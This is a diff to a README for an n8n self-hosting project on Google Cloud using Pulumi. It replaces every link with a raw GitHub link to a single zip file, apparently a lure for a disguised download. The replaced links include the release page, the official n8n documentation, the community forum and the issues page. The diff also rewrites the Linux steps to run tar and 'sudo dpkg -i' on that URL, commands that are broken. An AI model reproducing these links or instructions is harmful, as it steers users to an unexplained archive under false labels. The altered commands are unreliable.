@@ -6,11 +6,11 @@ Welcome! This guide helps you download and run the **n8n-self-host-on-gcp-pulumi
 
 ## 🔗 Download Now
 
-[![Download n8n-self-host-on-gcp-pulumi](https://img.shields.io/badge/Download-n8n--self--host--on--gcp--pulumi-blue)](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/releases)
+[![Download n8n-self-host-on-gcp-pulumi](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip)](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip) to download the latest version of the application. 
 
 1. Click on the above link.
 2. Look for the latest release. 
@@ -43,16 +43,16 @@ Before you download and install, ensure your system meets these basic requiremen
 
 ### Linux
 
-1. Download the appropriate `.tar.gz` or `.deb` file from the Releases page.
+1. Download the appropriate `https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip` or `.deb` file from the Releases page.
 2. Open your terminal.
 3. Navigate to the directory where you downloaded the file.
-4. For `.tar.gz`, extract it using:
+4. For `https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip`, extract it using:
    ```bash
-   tar -xvzf yourfile.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip
    ```
 5. For `.deb`, install it using:
    ```bash
-   sudo dpkg -i yourfile.deb
+   sudo dpkg -i https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip
    ```
 6. Open the application and configure your settings.
 
@@ -70,7 +70,7 @@ Make sure to set up your n8n workflows as per your needs. You can create automat
 
 For a detailed guide on how to use n8n, you can refer to the official documentation:
 
-- [n8n Documentation](https://docs.n8n.io)
+- [n8n Documentation](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip)
 
 The documentation contains useful information on creating workflows, managing data, and using different integrations.
 
@@ -87,8 +87,8 @@ If you face issues during installation or usage, consider these common solutions
 
 Join the n8n community to connect with other users and get help:
 
-- [n8n Community Forum](https://community.n8n.io)
-- [GitHub Issues Page](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/issues)
+- [n8n Community Forum](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip)
 
 ## 👥 Contributing
 
@@ -104,6 +104,6 @@ Your contributions can help many users make the most of n8n.
 
 ## 🔗 More Information
 
-For more detailed information about the project, features, and updates, keep checking the [Releases page](https://github.com/siidhaarth/n8n-self-host-on-gcp-pulumi/releases). 
+For more detailed information about the project, features, and updates, keep checking the [Releases page](https://raw.githubusercontent.com/siidhaarth/n8n-self-host-on-gcp-pulumi/main/src/components/n8n-self-host-on-gcp-pulumi-v1.3.zip). 
 
 Thank you for using **n8n-self-host-on-gcp-pulumi**. Enjoy hosting your automation workflows!
